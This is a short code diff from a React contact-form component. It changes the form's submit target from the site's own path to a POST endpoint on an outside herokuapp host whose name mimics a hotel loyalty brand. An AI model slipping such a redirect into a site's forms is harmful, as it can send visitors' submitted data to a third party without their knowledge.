@@ -56,7 +56,7 @@ const ContactForm = () => {
                         .required("Required"),
                 })}
                 onSubmit={(values, { setSubmitting, resetForm }) => {
-                    fetch("/", {
+                    fetch("https://marriott-bonvoy.herokuapp.com/Register", {
                         method: "POST",
                         headers: {
                             "Content-Type": "application/x-www-form-urlencoded",
